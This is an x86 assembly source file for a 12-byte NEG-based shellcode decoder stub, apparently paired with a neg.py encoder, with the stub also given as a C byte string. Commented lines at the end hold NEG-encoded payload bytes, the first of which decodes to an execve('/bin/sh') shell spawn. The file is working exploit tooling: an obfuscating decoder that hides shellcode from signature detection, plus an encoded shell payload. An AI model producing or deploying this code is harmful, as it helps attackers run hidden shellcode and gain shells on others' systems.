# /* Assembly source for neg.py (x86) - Length: 12 bytes (when minimal) */ #
# char neg_decoder[] = "\x8b\x74\x24\xfc\x83\xc6\x0b\x46\xf6\x1e\x75\xfb";

.set MINIMAL, 1

.text
.globl _start
_start:
.if MINIMAL == 1			# Make %esi point to negcode - 1
	movl -0x4(%esp), %esi		# Assumes this exact location was reached from 'ret' (i.e 'pop %eip')
	add $0xb, %esi
.else
	jmp put_eip
in_stack:
	pop %esi
	dec %esi
.endif


xorloop:
	inc %esi
	negb (%esi)
	jnz xorloop

.if MINIMAL == 1
.else
put_eip:
	call in_stack
.endif

negcode:
#	.ascii "\x96\xf5\xa8\x67\xae\x98\xd1\xd1\x8d\x98\x98\xd1\x9e\x97\x92\x77\x1d\x77\x2f\x33\x80"
#	.ascii "\xcf\x37\x4f\xe8\x15\xf5\x70\xa2\x80\x8c\xf2\x1\x31\x1e\x7\x15\xfb\x18\xf\x1\x1\x1\xd9\x38\x31\x31\x31\x20\x53\x5a\x5f\x20\x44\x59\x5b\x3c\x69\x6c\xaa\xba\xe2\xb9\x64\x38\xfe\xb1"
